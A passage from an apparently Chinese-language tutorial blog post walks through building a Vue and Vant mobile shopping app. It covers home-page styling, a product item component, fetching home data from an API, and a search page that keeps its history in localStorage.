#c21401;</span><br><span class="line">  ::v-deep .van-nav-bar__title {</span><br><span class="line">    color: #fff;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// 搜索框样式定制</span><br><span class="line">.van-search {</span><br><span class="line">  position: fixed;</span><br><span class="line">  width: 100%;</span><br><span class="line">  top: 46px;</span><br><span class="line">  z-index: 999;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// 分类导航部分</span><br><span class="line">.my-swipe .van-swipe-item {</span><br><span class="line">  height: 185px;</span><br><span class="line">  color: #fff;</span><br><span class="line">  font-size: 20px;</span><br><span class="line">  text-align: center;</span><br><span class="line">  background-color: #39a9ed;</span><br><span class="line">}</span><br><span class="line">.my-swipe .van-swipe-item img {</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 185px;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// 主会场</span><br><span class="line">.main img {</span><br><span class="line">  display: block;</span><br><span class="line">  width: 100%;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// 猜你喜欢</span><br><span class="line">.guess .guess-title {</span><br><span class="line">  height: 40px;</span><br><span class="line">  line-height: 40px;</span><br><span class="line">  text-align: center;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// 商品样式</span><br><span class="line">.goods-list {</span><br><span class="line">  background-color: #f6f6f6;</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><p>其中将商品项封装成组件 GoodsItem.vue 在 components 包下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class="goods-item" @click="$router.push('/prodetail')"&gt;</span><br><span class="line">    &lt;div class="left"&gt;</span><br><span class="line">      &lt;img src="@/assets/product.jpg" alt="" /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="right"&gt;</span><br><span class="line">      &lt;p class="tit text-ellipsis-2"&gt;</span><br><span class="line">        三星手机 SAMSUNG Galaxy S23 8GB+256GB 超视觉夜拍系统 超清夜景 悠雾紫</span><br><span class="line">        5G手机 游戏拍照旗舰机s23</span><br><span class="line">      &lt;/p&gt;</span><br><span class="line">      &lt;p class="count"&gt;已售104件&lt;/p&gt;</span><br><span class="line">      &lt;p class="price"&gt;</span><br><span class="line">        &lt;span class="new"&gt;¥3999.00&lt;/span&gt;</span><br><span class="line">        &lt;span class="old"&gt;¥6699.00&lt;/span&gt;</span><br><span class="line">      &lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default {};</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang="less" scoped&gt;</span><br><span class="line">.goods-item {</span><br><span class="line">  height: 148px;</span><br><span class="line">  margin-bottom: 6px;</span><br><span class="line">  padding: 10px;</span><br><span class="line">  background-color: #fff;</span><br><span class="line">  display: flex;</span><br><span class="line">  .left {</span><br><span class="line">    width: 127px;</span><br><span class="line">    img {</span><br><span class="line">      display: block;</span><br><span class="line">      width: 100%;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  .right {</span><br><span class="line">    flex: 1;</span><br><span class="line">    font-size: 14px;</span><br><span class="line">    line-height: 1.3;</span><br><span class="line">    padding: 10px;</span><br><span class="line">    display: flex;</span><br><span class="line">    flex-direction: column;</span><br><span class="line">    justify-content: space-evenly;</span><br><span class="line"></span><br><span class="line">    .count {</span><br><span class="line">      color: #999;</span><br><span class="line">      font-size: 12px;</span><br><span class="line">    }</span><br><span class="line">    .price {</span><br><span class="line">      color: #999;</span><br><span class="line">      font-size: 16px;</span><br><span class="line">      .new {</span><br><span class="line">        color: #f03c3c;</span><br><span class="line">        margin-right: 10px;</span><br><span class="line">      }</span><br><span class="line">      .old {</span><br><span class="line">        text-decoration: line-through;</span><br><span class="line">        font-size: 12px;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="首页-动态渲染"><a class="markdownIt-Anchor" href="#首页-动态渲染"></a> 首页 - 动态渲染</h3><p>根据接口文档封装请求首页数据模块于 api 包下，新建 home.js：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request <span class="keyword">from</span> <span class="string">"@/utils/request"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取首页数据</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">getHomeData</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">request</span>(<span class="string">"/page/detail"</span>, {</span><br><span class="line">    <span class="attr">params</span>: {</span><br><span class="line">      <span class="attr">pageId</span>: <span class="number">0</span>,</span><br><span class="line">    },</span><br><span class="line">  });</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>接着转到 layout 的 home.vue 处理动态渲染：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">GoodsItem</span> <span class="keyword">from</span> <span class="string">"@/components/GoodsItem.vue"</span>;</span><br><span class="line"><span class="keyword">import</span> { getHomeData } <span class="keyword">from</span> <span class="string">"@/api/home"</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> {</span><br><span class="line">  <span class="attr">name</span>: <span class="string">"HomePage"</span>,</span><br><span class="line">  <span class="attr">components</span>: {</span><br><span class="line">    <span class="title class_">GoodsItem</span>,</span><br><span class="line">  },</span><br><span class="line">  <span class="title function_">data</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">      <span class="attr">bannerList</span>: [],</span><br><span class="line">      <span class="attr">navList</span>: [],</span><br><span class="line">      <span class="attr">prodsList</span>: [],</span><br><span class="line">    };</span><br><span class="line">  },</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">created</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">const</span> {</span><br><span class="line">      <span class="attr">data</span>: { pageData },</span><br><span class="line">    } = <span class="keyword">await</span> <span class="title function_">getHomeData</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(pageData);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bannerList</span> = pageData.<span class="property">items</span>[<span class="number">1</span>].<span class="property">data</span>; <span class="comment">// 获取轮播图数据</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">navList</span> = pageData.<span class="property">items</span>[<span class="number">3</span>].<span class="property">data</span>; <span class="comment">// 获取导航组数据</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">prodsList</span> = pageData.<span class="property">items</span>[<span class="number">6</span>].<span class="property">data</span>; <span class="comment">// 获取商品组数据</span></span><br><span class="line">  },</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>改造 template 中轮播图和导航部分：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 轮播图 --&gt;</span><br><span class="line">&lt;van-swipe class="my-swipe" :autoplay="3000" indicator-color="white"&gt;</span><br><span class="line">      &lt;van-swipe-item v-for="item in bannerList" :key="item.imgUrl"&gt;</span><br><span class="line">        &lt;img :src="item.imgUrl" alt=""&gt;</span><br><span class="line">      &lt;/van-swipe-item&gt;</span><br><span class="line">    &lt;/van-swipe&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 导航 --&gt;</span><br><span class="line">&lt;van-grid column-num="5" icon-size="40"&gt;</span><br><span class="line">      &lt;van-grid-item</span><br><span class="line">        v-for="item in navList" :key="item.imgUrl"</span><br><span class="line">        :icon="item.imgUrl"</span><br><span class="line">        :text="item.text"</span><br><span class="line">        @click="$router.push('/category')"</span><br><span class="line">      /&gt;</span><br><span class="line">    &lt;/van-grid&gt;</span><br></pre></td></tr></tbody></table></figure><p>接着改造商品组：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 猜你喜欢 --&gt;</span><br><span class="line">    &lt;div class="guess"&gt;</span><br><span class="line">      &lt;p class="guess-title"&gt;—— 猜你喜欢 ——&lt;/p&gt;</span><br><span class="line">      &lt;div class="goods-list"&gt;</span><br><span class="line">        &lt;GoodsItem v-for="item in prodsList" :key="item.goods_id" :goods="item"&gt;&lt;/GoodsItem&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br></pre></td></tr></tbody></table></figure><p>父传子将 item 整个对象传给 GoodsItem 进行接收：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> {</span><br><span class="line">  <span class="attr">name</span>: <span class="string">'GoodsItem'</span>,</span><br><span class="line">  <span class="attr">props</span>: {</span><br><span class="line">    <span class="attr">goods</span>: {</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">Object</span>,</span><br><span class="line">      <span class="attr">default</span>: <span class="function">() =&gt;</span> {</span><br><span class="line">        <span class="keyword">return</span> {}</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  },</span><br><span class="line">  <span class="title function_">data</span> () {</span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">    }</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>然后改造 template</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;div</span><br><span class="line">  class="goods-item"</span><br><span class="line">  v-if="goods.goods_id"</span><br><span class="line">  @click="$router.push(`/prodetail/${goods.goods_id}`)"</span><br><span class="line">&gt;</span><br><span class="line">    &lt;div class="left"&gt;</span><br><span class="line">      &lt;img :src="goods.goods_image" alt="" /&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;div class="right"&gt;</span><br><span class="line">      &lt;p class="tit text-ellipsis-2"&gt;</span><br><span class="line">        {{ goods.goods_name }}</span><br><span class="line">      &lt;/p&gt;</span><br><span class="line">      &lt;p class="count"&gt;{{goods.goods_sales}}&lt;/p&gt;</span><br><span class="line">      &lt;p class="price"&gt;</span><br><span class="line">        &lt;span class="new"&gt;{{goods.goods_price_min}}&lt;/span&gt;</span><br><span class="line">        &lt;span class="old"&gt;{{goods.goods_price_max}}&lt;/span&gt;</span><br><span class="line">      &lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br></pre></td></tr></tbody></table></figure><p>注意将商品 id 携带进行跳转时要动态取值使用反引号。</p><h2 id="搜索"><a class="markdownIt-Anchor" href="#搜索"></a> 搜索</h2><p>页面设计：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408292021783.png" alt="image-20230621144449700"></p><h3 id="搜索页静态结构"><a class="markdownIt-Anchor" href="#搜索页静态结构"></a> 搜索页静态结构</h3><p><code>view/search/index.vue</code>（需要导入 vant 组件 Icon）</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class="search"&gt;</span><br><span class="line">    &lt;van-nav-bar title="商品搜索" left-arrow @click-left="$router.go(-1)" /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;van-search show-action placeholder="请输入搜索关键词" clearable&gt;</span><br><span class="line">      &lt;template #action&gt;</span><br><span class="line">        &lt;div&gt;搜索&lt;/div&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line">    &lt;/van-search&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 搜索历史 --&gt;</span><br><span class="line">    &lt;div class="search-history" v-if="historyList.length &gt; 0"&gt;</span><br><span class="line">      &lt;div class="title"&gt;</span><br><span class="line">        &lt;span&gt;最近搜索&lt;/span&gt;</span><br><span class="line">        &lt;van-icon name="delete-o" size="16" /&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div class="list"&gt;</span><br><span class="line">        &lt;div</span><br><span class="line">          class="list-item"</span><br><span class="line">          v-for="item in historyList"</span><br><span class="line">          :key="item"</span><br><span class="line">          @click="$router.push('/searchlist')"</span><br><span class="line">        &gt;</span><br><span class="line">          {{ item }}</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default {</span><br><span class="line">  name: "SearchIndex",</span><br><span class="line">  data() {</span><br><span class="line">    return {</span><br><span class="line">      historyList: ["炒锅", "电视", "冰箱", "手机", "自行车"],</span><br><span class="line">    };</span><br><span class="line">  },</span><br><span class="line">};</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang="less" scoped&gt;</span><br><span class="line">.search {</span><br><span class="line">  .searchBtn {</span><br><span class="line">    background-color: #fa2209;</span><br><span class="line">    color: #fff;</span><br><span class="line">  }</span><br><span class="line">  ::v-deep .van-search__action {</span><br><span class="line">    background-color: #c21401;</span><br><span class="line">    color: #fff;</span><br><span class="line">    padding: 0 20px;</span><br><span class="line">    border-radius: 0 5px 5px 0;</span><br><span class="line">    margin-right: 10px;</span><br><span class="line">  }</span><br><span class="line">  ::v-deep .van-icon-arrow-left {</span><br><span class="line">    color: #333;</span><br><span class="line">  }</span><br><span class="line">  .title {</span><br><span class="line">    height: 40px;</span><br><span class="line">    line-height: 40px;</span><br><span class="line">    font-size: 14px;</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: space-between;</span><br><span class="line">    align-items: center;</span><br><span class="line">    padding: 0 15px;</span><br><span class="line">  }</span><br><span class="line">  .list {</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: flex-start;</span><br><span class="line">    flex-wrap: wrap;</span><br><span class="line">    padding: 0 10px;</span><br><span class="line">    gap: 5%;</span><br><span class="line">  }</span><br><span class="line">  .list-item {</span><br><span class="line">    width: 25%;</span><br><span class="line">    text-align: center;</span><br><span class="line">    padding: 7px;</span><br><span class="line">    line-height: 15px;</span><br><span class="line">    border-radius: 50px;</span><br><span class="line">    background: #fff;</span><br><span class="line">    font-size: 13px;</span><br><span class="line">    border: 1px solid #efefef;</span><br><span class="line">    overflow: hidden;</span><br><span class="line">    white-space: nowrap;</span><br><span class="line">    text-overflow: ellipsis;</span><br><span class="line">    margin-bottom: 10px;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="历史记录管理"><a class="markdownIt-Anchor" href="#历史记录管理"></a> 历史记录管理</h3><p>目标：构建搜索页的静态布局，完成历史记录的管理<br>需求分析：</p><ol><li>搜索历史基本渲染</li><li>点击搜索 (添加历史)</li></ol><p>添加历史说明：</p><p>点击搜索按钮或底下历史记录，都能进行搜索</p><ol><li>若之前没有相同搜索关键字，则直接追加到最前面</li><li>若之前已有相同搜索关键字，将该原有关键字移除，再追加（相当于置顶）</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class="search"&gt;</span><br><span class="line">    &lt;van-nav-bar title="商品搜索" left-arrow @click-left="$router.go(-1)" /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;van-search</span><br><span class="line">      v-model="search"</span><br><span class="line">      @search="goSearch(search)"</span><br><span class="line">      show-action</span><br><span class="line">      placeholder="请输入搜索关键词"</span><br><span class="line">      clearable</span><br><span class="line">    &gt;</span><br><span class="line">      &lt;template #action&gt;</span><br><span class="line">        &lt;div @click="goSearch(search)"&gt;搜索&lt;/div&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line">    &lt;/van-search&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 搜索历史 --&gt;</span><br><span class="line">    &lt;div class="search-history" v-if="historyList.length &gt; 0"&gt;</span><br><span class="line">      &lt;div class="title"&gt;</span><br><span class="line">        &lt;span&gt;最近搜索&lt;/span&gt;</span><br><span class="line">        &lt;van-icon name="delete-o" @click="clearHistory" size="16" /&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">      &lt;div class="list"&gt;</span><br><span class="line">        &lt;div</span><br><span class="line">          class="list-item"</span><br><span class="line">          v-for="item in historyList"</span><br><span class="line">          :key="item"</span><br><span class="line">          @click="goSearch(item)"</span><br><span class="line">        &gt;</span><br><span class="line">          {{ item }}</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import { getHistory, setHistory } from "@/utils/storage";</span><br><span class="line"></span><br><span class="line">export default {</span><br><span class="line">  name: "SearchIndex",</span><br><span class="line">  data() {</span><br><span class="line">    return {</span><br><span class="line">      search: "",</span><br><span class="line">      historyList: getHistory(),</span><br><span class="line">    };</span><br><span class="line">  },</span><br><span class="line">  methods: {</span><br><span class="line">    goSearch(searchContent) {</span><br><span class="line">      // 判断输入的搜索词是否已经在historyList中</span><br><span class="line">      const index = this.historyList.indexOf(searchContent);</span><br><span class="line">      if (index !== -1) {</span><br><span class="line">        // 说明存在，则将其进行删除</span><br><span class="line">        this.historyList.splice(index, 1); // splice语法：splice(index, howMany, item1, ....., itemX)</span><br><span class="line">      }</span><br><span class="line">      // 将搜索词添加到historyList的最前面</span><br><span class="line">      this.historyList.unshift(searchContent);</span><br><span class="line">      setHistory(this.historyList);</span><br><span class="line">      // 跳转到搜索列表页面</span><br><span class="line">      this.$router.push(`/searchlist?search=${searchContent}`);</span><br><span class="line">    },</span><br><span class="line">    clearHistory() {</span><br><span class="line">      this.historyList = [];</span><br><span class="line">      setHistory([]);</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">};</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><p>持久化存储代码：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">HISTORY_KEY</span> = <span class="string">"shopping_history_info"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取搜索历史</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">getHistory</span> = (<span class="params"></span>) =&gt; {</span><br><span class="line">  <span class="keyword">const</span> history = <span class="variable language_">localStorage</span>.<span class="title function_">getItem</span>(<span class="variable constant_">HISTORY_KEY</span>);</span><br><span class="line">  <span class="keyword">return</span> history ? <span class="title class_">JSON</span>.<span class="title function_">parse</span>(history) : [];</span><br><span class="line">};</span><br><span class="line"><span class="comment">// 设置搜索历史</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">setHistory</span> = (<span class="params">arr</span>) =&gt; {</span><br><span class="line">  <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="variable constant_">HISTORY_KEY</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(arr));</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="搜索列表页"><a class="markdownIt-Anchor" href="#搜索列表页"></a> 搜索列表页</h3><h4 id="静态布局"><a class="markdownIt-Anchor" href="#静态布局"></a> 静态布局</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class="search"&gt;</span><br><span class="line">    &lt;van-nav-bar</span><br><span class="line">      fixed</span><br><span class="line">      title="商品列表"</span><br><span class="line">      left-arrow</span><br><span class="line">      @click-left="$router.go(-1)"</span><br><span class="line">    /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;van-search</span><br><span class="line">      readonly</span><br><span class="line">      shape="round"</span><br><span class="line">      background="#ffffff"</span><br><span class="line">      value="手机"</span><br><span class="line">      show-action</span><br><span class="line">      @click="$router.push('/search')"</span><br><span class="line">    &gt;</span><br><span class="line">      &lt;template #action&gt;</span><br><span class="line">        &lt;van-icon class="tool" name="apps-o" /&gt;</span><br><span class="line">      &lt;/template&gt;</span><br><span class="line">    &lt;/van-search&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 排序选项按钮 --&gt;</span><br><span class="line">    &lt;div class="sort-btns"&gt;</span><br><span class="line">      &lt;div class="sort-item"&gt;综合&lt;/div&gt;</span><br><span class="line">      &lt;div class="sort-item"&gt;销量&lt;/div&gt;</span><br><span class="line">      &lt;div 